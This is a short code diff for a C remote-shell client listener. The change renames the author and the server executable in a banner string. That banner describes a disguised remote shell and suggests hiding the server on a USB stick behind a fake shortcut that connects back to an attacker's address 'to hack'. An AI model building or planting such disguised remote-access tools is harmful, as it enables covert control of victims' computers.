@@ -10,7 +10,7 @@
 #pragma comment (lib, "AdvApi32.lib")
 #define PORT 12345
 int main() {
-    printf("\aRemoteShellClient by Arin Jander\nThis is the counterpart to RemoteShellServer, a remote connection disguised as whatever you want! Always start this program before the server, or have it running if you're using this to hack. Maybe you could hide RemoteShellServer on a USB stick, and have a fake shortcut that opens 'RemoteShellServer.exe \"Your-remote-controller's IP or adddress\"! You can use this for legal purposes too. Just remember its not encrypted! Your computer will beep when a connection is established.\n");
+    printf("\aRemoteShellClient by fossilfishhooks\nThis is the counterpart to RemoteShellServer, a remote connection disguised as whatever you want! Always start this program before the server, or have it running if you're using this to hack. Maybe you could hide RemoteShellServer on a USB stick, and have a fake shortcut that opens 'shs.exe \"Your-remote-controller's IP or adddress\"! You can use this for legal purposes too. Just remember its not encrypted! Your computer will beep when a connection is established.\n");
     WSADATA wsaData;
     SOCKET serverSocket, clientSocket;
     struct sockaddr_in serverAddr, clientAddr;
